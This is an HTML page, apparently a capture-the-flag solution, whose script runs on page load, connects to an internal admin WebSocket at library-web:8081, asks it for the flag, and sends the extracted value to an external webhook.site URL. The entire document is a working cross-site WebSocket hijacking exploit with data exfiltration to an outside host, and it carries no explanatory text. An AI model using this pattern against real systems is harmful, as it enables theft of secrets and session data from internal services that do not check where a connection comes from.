
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Retrieve Flag</title>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const ws = new WebSocket('ws://library-web:8081/admin/ws'); // Replace <server-address> with the actual server address

            ws.onopen = () => {
                console.log('WebSocket connection opened.');
                ws.send('flag'); // Request the flag
            };

            ws.onmessage = (event) => {
                console.log('Message from server:', event.data);

                // Extract the flag, assuming the flag is sent in the format "{hi}"
                const match = event.data.match(/\{(.+?)\}/);
                if (match) {
                    const flag = match[1]; // Extract the content inside the curly braces
                    const url = `https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/${flag}`;
                    
                    // Open the constructed URL
                    window.open(url, '_blank'); // Opens the URL in a new tab
                }
                ws.close();
            };

            ws.onclose = () => {
                console.log('WebSocket connection closed.');
            };

            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };
        });
    </script>
</head>
<body>
</body>
</html>
